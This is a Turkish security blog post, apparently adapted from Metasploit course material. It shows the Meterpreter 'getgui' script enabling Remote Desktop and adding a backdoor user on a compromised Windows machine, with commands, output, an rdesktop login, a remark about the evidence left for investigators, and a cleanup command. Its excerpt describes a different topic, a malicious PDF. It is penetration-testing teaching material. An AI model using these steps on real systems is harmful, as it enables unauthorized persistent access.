---
title: MSF Remote Desktop Modülü
layout: post
date: '2017-05-25 09:05:06 +0300'
type: post
author: siberoloji
img: metasploit.jpg
published: true
status: publish
categories:
- Nasıl
- Araştırma
tags:
- msfconsole
- metasploit Framework
- Metasploit Framework client exploit
- msf client side exploit
excerpt: Bu yazımızda, Metasplot Framework kullanarak İstemci tarafı exploit olarak
  bir PDF dosyası oluşturmayı göreceğiz. Oluşturulan PDF, görünürde zararsız olsa
  da içerisine zararlı kodlar gömülebilir.
---

Enabling Remote Desktop
Let’s look at another situation where Metasploit makes it very easy to backdoor the system using nothing more than built-in system tools. We will utilize Carlos Perez’s ‘getgui’ script, which enables Remote Desktop and creates a user account for you to log into it with. Utilization of this script could not be easier.

meterpreter > run getgui -h
Windows Remote Desktop Enabler Meterpreter Script
Usage: getgui -u  -p 
Or:    getgui -e

OPTIONS:

    -e   Enable RDP only.
    -f   Forward RDP Connection.
    -h   Help menu.
    -l   The language switch
         Possible Options: 'de_DE', 'en_EN' / default is: 'en_EN'
    -p   The Password of the user

meterpreter > run getgui -u loneferret -p password
[*] Windows Remote Desktop Configuration Meterpreter Script by Darkoperator
[*] Carlos Perez carlos_perez@darkoperator.com
[*] Language detection started
[*]   Language detected: en_US
[*] Setting user account for logon
[*]   Adding User: loneferret with Password: password
[*]   Adding User: loneferret to local group ''
[*]   Adding User: loneferret to local group ''
[*] You can now login with the created user
[*] For cleanup use command: run multi_console_command -rc /root/.msf4/logs/scripts/getgui/clean_up__20110112.2448.rc
meterpreter >

And we are done! That is it. Let’s test the connection to see if it can really be that easy.


root@kali:~#: rdesktop -u loneferret -p password 192.168.101.108


And here we see that it is. We used the ‘rdesktop’ command and specified the username and password we want to use for the log in. We then received an error message letting us know a user was already logged into the console of the system, and that if we continue, that user will be disconnected. This is expected behavior for a Windows XP desktop system, so we can see everything is working as expected. Note that Windows Server allows concurrent graphical logons so you may not encounter this warning message.

Remember, these sorts of changes can be very powerful. However, use that power wisely, as all of these steps alter the systems in ways that can be used by investigators to track what sort of actions were taken on the system. The more changes that are made, the more evidence you leave behind.

When you are done with the current system, you will want to run the cleanup script provided to removed the added account.

meterpreter > run multi_console_command -rc /root/.msf4/logs/scripts/getgui/clean_up__20110112.2448.rc
[*] Running Command List ...
[*]   Running command execute -H -f cmd.exe -a "/c net user hacker /delete"
Process 288 created.
meterpreter >